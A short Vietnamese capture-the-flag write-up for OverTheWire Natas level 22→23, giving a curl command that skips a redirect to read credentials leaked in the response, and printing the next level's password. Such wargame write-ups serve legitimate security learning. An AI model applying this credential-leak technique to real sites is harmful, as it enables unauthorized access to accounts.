# Natas 22 → 23

## Mục tiêu

Lấy password của `natas23` từ trang tự redirect.

## Tôi thấy

Request có tham số `revelio` làm trang trả credentials rồi redirect về `/`.

## Cách làm

```bash
curl -u natas22:<password> -i \
  'http://natas22.natas.labs.overthewire.org/?revelio=1'
```

Không follow redirect để giữ response chứa credentials.

## Vì sao cách này hiệu quả

Kiểm tra redirect diễn ra sau khi output credentials đã được tạo. `Location: /` chỉ che nội dung khi client tự động follow redirect.

## Kết quả

Password của `natas23`:

```text
CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5
```

